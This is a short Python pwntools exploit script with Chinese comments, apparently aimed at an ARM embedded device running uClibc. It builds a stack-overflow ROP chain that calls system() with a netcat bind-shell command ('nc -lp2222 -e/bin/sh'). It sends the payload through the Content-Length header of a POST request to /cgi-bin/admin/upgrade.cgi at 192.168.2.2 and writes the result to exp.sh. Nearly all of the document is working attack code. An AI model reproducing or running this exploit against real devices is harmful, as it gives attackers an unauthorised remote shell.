# -*- coding: UTF-8 -*-

from pwn import *
import os
libc_base = 0xb6f2d000  # libC 库在内存中的加载地址
stack_base = 0xbeffeb70 # 崩溃时 SP 寄存器的地址
libc_elf = ELF('libuClibc-0.9.33.3-git.so')

payload = bytes((0x38 - 4) * 'a',encoding='utf-8') # padding
print (payload)
payload +=  p32(0x00048784 + libc_base) # gadget1 pop {r1, pc} 
payload += p32(0x80 + stack_base) # 栈中命令参数地址
payload += p32(0x00016aa4 + libc_base) # gadget2 mov r0, r1 ; pop {r4, r5, pc}
payload += bytes((0x8 * 'a'),encoding='utf-8') # padding
print (payload)
payload += p32(libc_elf.symbols['system'] + libc_base) # 内存中 system() 函数地址
payload += bytes(('pwd;' * 0x100 + 'nc\x20-lp2222\x20-e/bin/sh\x20>'),encoding='utf-8') # 命令参数
payload = b'echo -en "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:'+payload
payload+=b'\n\r\n\r\n"  | nc -v 192.168.2.2 80' 
#os.system(payload)
print(payload)
f=open("exp.sh","wb")
f.write(payload)
